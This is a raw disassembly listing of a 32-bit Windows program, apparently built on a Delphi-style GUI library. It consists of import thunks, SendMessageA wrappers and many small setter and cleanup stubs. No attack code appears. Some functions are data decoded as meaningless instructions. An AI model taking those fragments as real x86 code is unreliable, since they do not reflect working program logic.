jmp [ ImageList_GetBkColor@IAT ]
sub_42be48
shl eax 0x8
retn
ImageList_Replace
jmp [ __import_lookup_table_13(comctl32:ImageList_Replace) ]
ImageList_Remove
jmp [ __import_lookup_table_13(comctl32:ImageList_Remove) ]
ImageList_BeginDrag
jmp [ ImageList_BeginDrag@IAT ]
ImageList_EndDrag
jmp [ __import_lookup_table_13(comctl32:ImageList_EndDrag) ]
ImageList_DragEnter
jmp [ ImageList_DragEnter@IAT ]
ImageList_DragLeave
jmp [ ImageList_DragLeave@IAT ]
ImageList_DragMove
jmp [ ImageList_DragMove@IAT ]
ImageList_DragShowNolock
jmp [ ImageList_DragShowNolock@IAT ]
ImageList_GetDragImage
jmp [ ImageList_GetDragImage@IAT ]
ImageList_Read
jmp [ ImageList_Read@IAT ]
ImageList_Write
jmp [ __import_lookup_table_13(comctl32:ImageList_Write) ]
ImageList_GetIconSize
jmp [ __import_lookup_table_13(comctl32:ImageList_GetIconSize) ]
ImageList_SetIconSize
jmp [ __import_lookup_table_13(comctl32:ImageList_SetIconSize) ]
sub_42becc
push 0x0
push 0x0
push 0x1004
push eax
call SendMessageA
retn
sub_42bedc
shl eax 0xc
retn
sub_42bee0
push ebx
push esi
mov esi edx
mov ebx eax
push esi
push 0x0
push 0x1005
push ebx
call SendMessageA
pop esi
pop ebx
retn
sub_42bef8
push ebx
push esi
mov esi edx
mov ebx eax
push esi
push 0x0
push 0x1006
push ebx
call SendMessageA
pop esi
pop ebx
retn
sub_42bf10
push ebx
push esi
mov esi edx
mov ebx eax
push esi
push 0x0
push 0x1007
push ebx
call SendMessageA
pop esi
pop ebx
retn
sub_42bf28
push ecx
push edx
push 0x100d
push eax
call SendMessageA
retn
sub_42c035
jmp sub_4038bc
sub_42c03c
pop ebp
retn
sub_42c040
sub [ rw-data ] 0x1
retn
sub_42c107
jmp sub_4038bc
sub_42c10e
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42c724
push r-xdata
call GetModuleHandleA
mov [ rw-data ] eax
mov [ rw-data ] sub_42c130
mov [ rw-data ] sub_42c248
mov [ rw-data ] sub_42c1b8
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] sub_42c44c
mov [ rw-data ] sub_42c520
mov [ rw-data ] sub_42c5f4
retn
sub_42c7b5
jmp sub_4038bc
sub_42c7bc
pop ebp
retn
sub_42c7c0
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_42c724
sub_42c7f5
jmp sub_4038bc
sub_42c7fc
pop ebp
retn
sub_42c800
sub [ rw-data ] 0x1
retn
sub_42ca41
add eax 0xffffffd8
jmp sub_42d6c4
sub_42ca49
add eax 0xffffffd8
jmp sub_42d6d8
sub_42ca5b
add [ esp + 0x4 ] 0xffffffd8
jmp sub_405888
sub_42ca65
add [ esp + 0x4 ] 0xffffffd8
jmp sub_40589c
sub_42ca6f
add eax 0xffffffd4
jmp sub_42d190
sub_42ca77
add eax 0xffffffd4
jmp sub_42d3a4
sub_42ca7f
add eax 0xffffffd4
jmp sub_42d4b8
sub_42ca8f
add eax 0xffffffd4
jmp sub_42d5bc
sub_42ca97
add eax 0xffffffd4
jmp sub_42d618
sub_42caa9
add [ esp + 0x4 ] 0xffffffd4
jmp sub_405888
sub_42cab3
add [ esp + 0x4 ] 0xffffffd4
jmp sub_40589c
sub_42cabf
push ecx
0x42
sub_42cac3
pop ebx
0x42
sub_42cac7
0x42
sub_42cacb
cmp edx ecx
inc edx
add [ ecx - 0x36 ] al
inc edx
add [ ecx - 0x36 ] cl
inc edx
add [ edi - 0x56ffbd36 ] bl
0x42
sub_42cadf
mov bl 0xca
inc edx
add [ edi - 0x36 ] ch
inc edx
add [ edi - 0x36 ] dh
inc edx
add [ edi - 0x36 ] bh
inc edx
add [ edi - 0x70ffbd36 ] al
0x42
sub_42caf7
xchg edi eax
0x42
sub_42cc42
jmp sub_4038bc
sub_42cc49
mov eax ebx
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_42ce59
jmp sub_4038bc
sub_42ce60
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42d015
jmp sub_4038bc
sub_42d07a
jmp sub_4038bc
sub_42d081
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42d16d
jmp sub_4038bc
sub_42d174
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_42d384
lea eax [ ebp - 0x30 ]
call sub_403eb8
lea eax [ ebp - 0x20 ]
call sub_403eb8
retn
sub_42d395
jmp sub_4038bc
j_sub_42d384
jmp sub_42d384
sub_42d39c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42d497
jmp sub_4038bc
sub_42d49e
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42d4b8
call sub_42cee8
retn
sub_42d59b
jmp sub_4038bc
sub_42d5a2
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42d602
lea eax [ ebp - 0x4 ]
call sub_4057b4
retn
sub_42d60b
jmp sub_4038bc
j_sub_42d602
jmp sub_42d602
sub_42d612
pop ebx
pop ecx
pop ebp
retn
sub_42d6ad
jmp sub_4038bc
sub_42d6b4
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_42d6c0
mov eax [ eax + 0x20 ]
retn
sub_42d6c4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x24 ]
call sub_403f0c
pop esi
pop ebx
retn
sub_42d7ef
jmp sub_4038bc
sub_42d7f6
pop ebp
retn
sub_42d7f8
sub [ rw-data ] 0x1
retn
sub_42d825
jmp sub_4038bc
sub_42d82c
pop ebp
retn
sub_42d830
sub [ rw-data ] 0x1
retn
sub_42d869
jmp sub_4038bc
sub_42d870
pop ebp
retn
sub_42d874
sub [ rw-data ] 0x1
retn
sub_42db81
jmp sub_4038bc
sub_42db88
pop ebp
retn
sub_42db8c
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_42d8d8
sub_42dc6c
retn
sub_42dce0
add eax 0x4
push eax
call EnterCriticalSection
retn
sub_42dcec
add eax 0x4
push eax
call LeaveCriticalSection
retn
sub_42dcf8
mov edx [ eax ]
call [ edx ]
retn
sub_42dd00
mov edx [ eax ]
call [ edx + 0x4 ]
retn
sub_42dd2d
jmp sub_4038bc
sub_42dd34
pop ebp
retn
sub_42dd38
sub [ rw-data ] 0x1
retn
sub_42def7
jmp sub_4038bc
sub_42defe
pop ebp
retn
sub_42e2b3
jmp sub_4038bc
sub_42e2ba
mov al [ ebp - 0x1 ]
pop ebx
pop ecx
pop ebp
retn
sub_42e6d4
jmp sub_4038bc
sub_42e6db
pop ebp
retn
sub_42e6e0
sub [ rw-data ] 0x1
jae r-xdata
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_42dc70
mov [ rw-data ] eax
sub_42e721
jmp sub_4038bc
sub_42e728
pop ebp
retn
sub_42e72c
sub [ rw-data ] 0x1
retn
sub_42eb4c
cmp dl [ eax + 0x209 ]
je r-xdata
retn
mov [ eax + 0x209 ] dl
call sub_44cd78
sub_42eb60
cmp dl [ eax + 0x20a ]
je r-xdata
retn
mov [ eax + 0x20a ] dl
call sub_44cd78
sub_42ed36
jmp sub_4038bc
sub_42ed3d
pop ecx
pop ecx
pop ebp
retn
sub_42ed44
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_44cd78
mov edx esi
mov eax ebx
call sub_44edb0
pop esi
pop ebx
retn
sub_42ed60
push ebx
mov ebx eax
mov eax ebx
call sub_44edf0
mov al [ r-xdata ]
cmp al [ ebx + 0x208 ]
je r-xdata
pop ebx
retn
mov eax ebx
call sub_44cd78
sub_42ee0c
retn
sub_42eebc
push ebx
mov ebx eax
mov eax [ ebx + 0x38 ]
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_446860
sub_42ef18
push ebx
mov ebx edx
mov edx ebx
call sub_463f04
or [ ebx + 0x4 ] 0x80000000
pop ebx
retn
sub_42f066
jmp sub_4038bc
sub_42f341
jmp sub_4038bc
sub_42f348
pop ebp
retn
sub_42f34c
sub [ rw-data ] 0x1
retn
sub_42f379
jmp sub_4038bc
sub_42f380
pop ebp
retn
sub_42f384
sub [ rw-data ] 0x1
retn
sub_42f3b1
jmp sub_4038bc
sub_42f3b8
pop ebp
retn
sub_42f3bc
sub [ rw-data ] 0x1
retn
sub_42f3e9
jmp sub_4038bc
sub_42f3f0
pop ebp
retn
sub_42f3f4
sub [ rw-data ] 0x1
retn
sub_42f421
jmp sub_4038bc
sub_42f428
pop ebp
retn
sub_42f42c
sub [ rw-data ] 0x1
retn
sub_42f49a
call [ eax + 0x33ec8b55 ]
rcl [ ebp + 0x68 ] 0xc1
hlt
sub_42f501
jmp sub_4038bc
sub_42f508
pop ebp
retn
sub_42f50c
sub [ rw-data ] 0x1
retn
sub_42f539
jmp sub_4038bc
sub_42f540
pop ebp
retn
sub_42f544
sub [ rw-data ] 0x1
retn
sub_42fe3a
jmp sub_403608
sub_42fe3f
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_469620
call sub_403970
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42fe5c
mov ecx [ eax ]
call [ ecx - 0x14 ]
retn
sub_42fe64
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
mov si 0xffef
call sub_403324
pop esi
retn
sub_42fe7c
push ebx
push esi
mov ebx edx
mov si 0xffee
call sub_403324
xor eax eax
mov [ ebx + 0xc ] eax
pop esi
pop ebx
retn
sub_42fe94
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
xor eax eax
mov [ esi + 0x3c ] eax
pop esi
retn
sub_42ff3d
jmp sub_4038bc
sub_42ff6b
jmp sub_4038bc
sub_42ff72
mov eax [ ebp - 0xc ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42ff7c
push ebx
cmp [ eax + 0x4a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
sub_42ff90
push ebx
cmp [ eax + 0x52 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
sub_430228
push ebx
cmp [ eax + 0x8a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x8c ]
call [ ebx + 0x88 ]
sub_430248
push ebx
cmp [ eax + 0x92 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x94 ]
call [ ebx + 0x90 ]
sub_430268
push ebx
cmp [ eax + 0x9a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x9c ]
call [ ebx + 0x98 ]
sub_4302ba
jmp sub_4038bc
sub_4302c1
pop ecx
pop ebp
retn
sub_430609
jmp sub_4038bc
sub_430610
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_430749
jmp sub_4038bc
sub_430750
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_43080f
jmp sub_4038bc
sub_430816
pop ebx
mov esp ebp
pop ebp
retn
sub_4308c8
cmp [ eax + 0x3c ] 0x0
je r-xdata
mov eax [ eax + 0x64 ]
retn
mov eax [ eax + 0x68 ]
retn
sub_430930
push ebx
mov ebx eax
mov edx r-xdata
mov eax ebx
call sub_430358
cmp eax 0x1
sbb eax eax
inc eax
pop ebx
retn
sub_430948
push ebx
cmp [ eax + 0xaa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov eax [ ebx + 0xac ]
call [ ebx + 0xa8 ]
sub_430ba8
mov edx [ rw-data ]
mov edx [ edx ]
mov eax [ eax + 0x158 ]
xchg edx eax
call sub_469ac0
retn
sub_430c18
jmp sub_4038bc
sub_430c1f
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_430cea
jmp sub_4038bc
sub_430cfb
jmp sub_403608
sub_430d26
jmp sub_4038bc
sub_430d5a
jmp sub_4038bc
sub_430d61
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_430f19
jmp sub_4038bc
sub_430f20
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_431578
jmp sub_4038bc
sub_43157f
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43168f
jmp sub_4038bc
sub_431696
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_4316a4
or ecx 0xffffffff
or edx 0xffffffff
call sub_4316b0
retn
sub_4316b0
push 0x0
push edx
push ecx
mov dl 0x4
mov cx [ r-xdata ]
call sub_4315cc
retn
sub_43186e
jmp sub_4038bc
sub_431875
pop ebp
retn
sub_431e40
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
int3
sub_432687
[ edx ]
sub_4333a4
xor edx edx
mov ecx [ eax + 0x168 ]
mov ecx [ ecx + 0xc ]
test ecx ecx
je r-xdata
mov eax edx
retn
mov eax ecx
mov edx [ eax ]
call [ edx + 0x24 ]
mov edx eax
sub_43359d
jmp sub_4038bc
sub_4335a4
pop ebx
mov esp ebp
pop ebp
retn
sub_4336b0
cmp dl [ eax + 0x179 ]
je r-xdata
retn
mov [ eax + 0x179 ] dl
mov edx eax
call sub_433720
sub_4336c8
push esi
mov esi eax
mov eax [ esi + 0x168 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_4336d8
cmp dl [ eax + 0x178 ]
je r-xdata
retn
mov [ eax + 0x178 ] dl
mov edx eax
call sub_433720
sub_4336f0
cmp dl [ eax + 0x17b ]
je r-xdata
retn
mov [ eax + 0x17b ] dl
mov edx eax
call sub_433720
sub_433708
cmp dl [ eax + 0x17d ]
je r-xdata
retn
mov [ eax + 0x17d ] dl
mov edx eax
call sub_433720
sub_433972
jmp sub_403608
sub_433a2b
jmp sub_4038bc
sub_433a32
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_433a70
push ebx
cmp [ eax + 0x3a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_433b9c
push ebx
mov ebx eax
mov eax ebx
call sub_44edb0
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_433bb0
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_433be4
cmp [ eax + 0x21e ] 0x0
jne r-xdata
retn
mov [ edx + 0xc ] 0x1
sub_433ce8
jmp sub_4038bc
sub_433cef
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_433e92
jmp sub_4038bc
sub_433e99
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_433ea3
inc [ ecx ]
add [ eax ] al
add [ edi ] dl
add [ eax ] al
mov [ eax + 0x220 ] dl
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_433eb8
push ebx
mov ebx eax
mov [ ebx + 0x211 ] dl
mov eax ebx
call sub_44c098
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_433ef0
push ebx
mov ebx eax
mov [ ebx + 0x214 ] edx
mov eax ebx
call sub_44c098
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_433f0c
push ebx
mov ebx eax
mov [ ebx + 0x218 ] edx
mov eax ebx
call sub_44c098
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_433f28
cmp dl [ eax + 0x21c ]
je r-xdata
retn
mov [ eax + 0x21c ] dl
call sub_44cd78
sub_433f3c
mov al [ eax + 0x220 ]
retn
sub_4340a5
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x210 ] 0x0
retn
sub_4340bd
jmp sub_4038bc
sub_4343c9
jmp sub_403608
sub_43453c
retn
sub_4346c9
jmp sub_4038bc
sub_43474c
push ebx
mov ebx eax
mov eax ebx
call sub_44b0a0
mov eax ebx
call sub_434540
pop ebx
retn
sub_434760
push ebx
mov ebx eax
mov [ ebx + 0x220 ] 0x1
mov eax ebx
call sub_44b7cc
mov [ ebx + 0x220 ] 0x0
mov eax ebx
call sub_434888
pop ebx
retn
sub_434878
push esi
mov esi eax
mov eax [ esi + 0x214 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_434951
jmp sub_4038bc
sub_434958
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4349a0
push ebx
mov ebx eax
mov eax ebx
call sub_44ed34
mov eax ebx
call sub_434540
pop ebx
retn
sub_4349b4
push ebx
mov ebx eax
mov eax ebx
call sub_43fe9c
mov eax ebx
call sub_434540
pop ebx
retn
sub_4349c8
mov al 0x1
retn
sub_4349cc
push ebp
mov ebp esp
pop ebp
retn 0x8
sub_434d04
jmp sub_4038bc
sub_434d0b
pop ebp
retn
sub_434d10
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax r-xdata
call sub_403c40
mov eax [ r-xdata ]
call sub_417d34
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_417d80
sub_434d6d
jmp sub_4038bc
sub_434d74
pop ebp
retn
sub_434d78
sub [ rw-data ] 0x1
retn
sub_434db1
jmp sub_4038bc
sub_434db8
pop ebp
retn
sub_434dbc
sub [ rw-data ] 0x1
jae r-xdata
retn
push r-xdata
call RegisterClipboardFormatA
mov [ rw-data ] ax
push r-xdata
call RegisterClipboardFormatA
mov [ rw-data ] ax
xor eax eax
mov [ rw-data ] eax
sub_434e38
retn
sub_434e39
jmp sub_4038bc
j_sub_434e38
jmp sub_434e38
sub_434e40
pop ebp
retn
sub_434e44
sub [ rw-data ] 0x1
retn
sub_4350a0
jmp r-xdata
sub_43588c
mov eax [ eax + 0x4 ]
cmp [ eax + 0x8 ] 0x0
sete al
retn
sub_43600f
jmp sub_4038bc
sub_43604b
jmp sub_4038bc
sub_436c56
jmp sub_4038bc
sub_436c5d
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_436ee4
call sub_44a520
retn
sub_436eec
push ebx
mov ebx eax
mov eax ebx
call sub_436f08
mov edx [ eax ]
call [ edx + 0x24 ]
pop ebx
retn
sub_436f00
mov eax [ r-xdata ]
retn
sub_436f08
mov eax [ eax + 0x16c ]
mov eax [ eax + 0x4 ]
retn
sub_436f14
push esi
mov esi eax
mov eax [ esi + 0x16c ]
call sub_4359fc
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
pop esi
retn
sub_436f2c
mov eax [ eax + 0x16c ]
mov al [ eax + 0x20 ]
retn
sub_436f64
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_437014
push esi
mov esi eax
cmp dl [ esi + 0x180 ]
je r-xdata
pop esi
retn
mov [ esi + 0x180 ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_437030
cmp edx [ eax + 0x168 ]
je r-xdata
retn
mov [ eax + 0x168 ] edx
call sub_436f6c
sub_437044
push esi
mov esi eax
cmp dl [ esi + 0x173 ]
je r-xdata
pop esi
retn
mov [ esi + 0x173 ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_437060
push esi
mov esi eax
cmp edx [ esi + 0x17c ]
je r-xdata
pop esi
retn
cmp edx 0xffffffff
jl r-xdata
mov [ esi + 0x17c ] edx
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_437080
push esi
mov esi eax
cmp edx [ esi + 0x174 ]
je r-xdata
pop esi
retn
mov [ esi + 0x174 ] edx
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_4370d8
cmp dl [ eax + 0x172 ]
je r-xdata
retn
mov [ eax + 0x172 ] dl
call sub_436f6c
sub_4370ec
push esi
mov esi eax
mov eax esi
call sub_44a6d0
cmp [ esi + 0x170 ] 0x0
je r-xdata
pop esi
retn
mov eax esi
mov si 0xffe9
call sub_403324
sub_437239
jmp sub_4038bc
sub_437240
pop edi
pop esi
pop ecx
pop ebp
retn
sub_437248
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_437250
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_437258
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x16c ]
mov eax esi
call sub_435988
mov dl [ ebx + 0x182 ]
mov eax esi
call sub_435a9c
pop esi
pop ebx
retn
sub_437488
push ebx
push esi
mov bl 0xb
mov esi rw-data
mov eax [ esi ]
call sub_403128
add esi 0x4
dec bl
jne r-xdata
pop esi
pop ebx
retn
sub_43754c
jmp sub_4038bc
sub_437553
pop ebp
retn
sub_437558
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax sub_4374a4
call sub_403c8c
mov eax rw-data
xor ecx ecx
mov edx 0x2c
call sub_402b34
sub_437b3d
jmp sub_4038bc
sub_437bec
push ebx
mov ebx eax
mov eax ebx
call sub_404378
push eax
call GetFileAttributesA
cmp eax 0xffffffff
setne al
pop ebx
retn
sub_437d40
jmp sub_403608
sub_437ddc
jmp sub_4038bc
sub_437de3
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_437dec
call sub_42ff7c
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46a170
retn
sub_437ed8
jmp sub_4038bc
sub_437edf
pop ebx
mov esp ebp
pop ebp
retn
sub_437ee4
mov edx [ rw-data ]
cmp [ edx ] 0x0
je r-xdata
xor edx edx
mov [ eax + 0x44 ] edx
test [ eax + 0x5e ] 0x1
jne r-xdata
mov edx r-xdata
mov [ eax + 0x44 ] edx
jmp r-xdata
call sub_430930
retn
sub_438162
jmp sub_4038bc
sub_438169
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_438186
lea eax [ ebp - 0x8 ]
call sub_403eb8
retn
sub_43817f
jmp sub_4038bc
sub_438186
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4381c2
add [ eax ] al
cmp [ ecx ] 0x1b
jne r-xdata
retn
mov eax edx
call sub_465de4
sub_43821f
jmp sub_4038bc
sub_438226
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_438251
jmp sub_4038bc
sub_438258
pop ebp
retn
sub_43825c
sub [ rw-data ] 0x1
retn
sub_4382b8
jmp sub_4038bc
sub_4382bf
pop ebp
retn
sub_4382c4
sub [ rw-data ] 0x1
retn
sub_438320
jmp sub_4038bc
sub_438327
pop ebp
retn
sub_43832c
sub [ rw-data ] 0x1
retn
sub_43838d
jmp sub_4038bc
sub_438394
pop ebp
retn
sub_438398
sub [ rw-data ] 0x1
retn
sub_4383e4
jmp sub_4038bc
sub_4383eb
pop ebp
retn
sub_4383f0
sub [ rw-data ] 0x1
retn
sub_439187
jmp sub_4038bc
sub_439194
mov edx [ eax + 0xc ]
test edx edx
je r-xdata
retn
xchg edx eax
mov ecx [ eax ]
call [ ecx + 0x1c ]
sub_43920c
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebx + 0x10 ]
mov edx esi
call sub_403f0c
mov eax ebx
call sub_439194
pop esi
pop ebx
retn
sub_439228
mov [ eax + 0x14 ] edx
call sub_439194
retn
sub_439234
mov [ eax + 0x18 ] edx
call sub_439194
retn
sub_43926c
push ebx
mov ebx eax
mov eax ebx
call sub_419398
mov [ eax + 0xc ] ebx
pop ebx
retn
sub_4393ec
cmp dl [ eax + 0x1d ]
je r-xdata
retn
mov [ eax + 0x1d ] dl
test dl dl
je r-xdata
mov edx sub_439240
call sub_43927c
sub_439404
mov edx sub_439240
call sub_43927c
retn
sub_4395c9
jmp sub_4038bc
sub_439604
push ebx
mov ebx ecx
mov eax ebx
call sub_403eb8
pop ebx
retn
sub_439610
mov al 0x1
retn
sub_439715
jmp sub_4038bc
sub_439810
retn
sub_439933
jmp sub_4038bc
sub_43993a
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_439c84
mov eax [ eax + 0xd0 ]
call sub_419538
retn
sub_439cf4
mov eax [ r-xdata ]
retn
sub_439d20
push esi
mov esi eax
mov eax [ esi + 0xd0 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_439d54
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032b4
pop ebx
retn
sub_439e44
retn
sub_439f8b
jmp sub_4038bc
sub_439f92
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_439f9c
retn
sub_439fbf
jmp sub_4038bc
sub_439fc6
pop ebp
retn 0x4
sub_43a029
jmp sub_4038bc
sub_43a030
pop ebp
retn
sub_43a034
sub [ rw-data ] 0x1
retn
sub_43a704
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
retn
mov eax r-xdata
call sub_40c04c
mov [ rw-data ] eax
sub_43a739
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push ebx
mov eax ecx
mov ecx [ ebp + 0x8 ]
xchg edx eax
mov ebx [ eax ]
call [ ebx + 0xc ]
pop ebx
pop ebp
retn 0x4
sub_43a750
push ebp
mov ebp esp
push ebx
mov eax ecx
mov ecx [ ebp + 0x8 ]
xchg edx eax
mov ebx [ eax ]
call [ ebx + 0x10 ]
pop ebx
pop ebp
retn 0x4
sub_43a780
push ebx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_43a778
cmp ebx [ eax + 0x28c ]
je r-xdata
mov eax ebx
call sub_403128
sub_43a9d4
mov edx [ eax + 0x4 ]
mov ecx [ edx + 0x4 ]
cmp [ ecx + 0x244 ] 0x0
je r-xdata
xchg edx eax
call sub_43aafc
retn
mov eax [ eax + 0x18 ]
retn
sub_43a9f0
or ecx 0xffffffff
xor edx edx
call sub_43a9fc
retn
sub_43aa70
mov eax [ eax + 0x4 ]
call sub_44f7d8
retn
sub_43ab24
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43aa7c
call sub_43a780
pop esi
pop ebx
retn
sub_43ab3c
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x6
mov [ eax + 0x4 ] edx
xor edx edx
mov [ eax + 0x8 ] edx
mov [ eax + 0x1c ] 0xffffffff
mov [ eax + 0x20 ] ecx
pop ebp
retn 0x4
sub_43abec
cmp [ eax + 0x215 ] 0x3
sete al
retn
sub_43ad65
jmp sub_4038bc
sub_43ad6c
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43ada8
mov eax [ eax + 0x23c ]
call sub_43a764
retn
sub_43aff8
push ebx
mov ebx eax
mov eax ebx
call sub_4192c8
mov eax ebx
call sub_4191a8
mov edx eax
mov eax [ ebx + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
pop ebx
retn
sub_43b064
push ebx
mov ebx eax
mov [ ebx + 0x20 ] edx
mov eax ebx
call sub_4191a8
mov edx eax
mov eax [ ebx + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
pop ebx
retn
sub_43b080
push ebx
mov ebx eax
mov [ ebx + 0x1c ] edx
mov eax ebx
call sub_4191a8
mov edx eax
mov eax [ ebx + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
pop ebx
retn
sub_43b09c
push ebx
mov ebx eax
mov eax ebx
call sub_43926c
pop ebx
retn
sub_43b110
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4393d8
pop esi
pop ebx
retn
sub_43b2b5
add [ esp + 0x4 ] 0xffffffec
jmp sub_43c3a0
sub_43b2bf
add [ esp + 0x4 ] 0xffffffec
jmp sub_43c48c
sub_43b2c9
add [ esp + 0x4 ] 0xffffffec
jmp sub_43c478
sub_43b2d3
add [ esp + 0x4 ] 0xffffffec
jmp sub_43c2f0
sub_43b2e7
add [ esp + 0x4 ] 0xffffffec
jmp sub_405888
sub_43b2f1
add [ esp + 0x4 ] 0xffffffec
jmp sub_40589c
sub_43b83c
push ebx
push esi
mov esi eax
mov eax [ esi + 0x274 ]
push eax
mov ecx [ esi + 0x270 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0xf4 ]
pop esi
pop ebx
retn
sub_43ba73
jmp sub_4038bc
sub_43bb6f
jmp sub_4038bc
sub_43bb76
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_43bb7c
bound esp [ edi ]
mov ebx 0xd06a7700
adc [ ebp + 0x4fc00035 ] esp
xlat
shl [ edx - 0x75 ] 0x1
cmp [ edx + eax ] 0x0
add [ ebx + 0x1452ff10 ] cl
retn
sub_43bb98
mov eax [ r-xdata ]
retn
sub_43bba0
mov eax [ r-xdata ]
retn
sub_43bca2
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov eax 0x10
retn
sub_43be39
jmp sub_4038bc
sub_43be40
pop ebx
pop ecx
pop ebp
retn
sub_43bf0a
jmp sub_4038bc
sub_43bf11
pop ecx
pop ebp
retn
sub_43bfa0
mov eax [ eax + 0x14 ]
call sub_419818
retn
sub_43c0e9
jmp sub_4038bc
sub_43c0f0
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_43c11c
mov eax [ eax + 0x14 ]
call sub_419538
retn
sub_43c128
mov eax [ eax + 0x14 ]
call sub_419538
retn
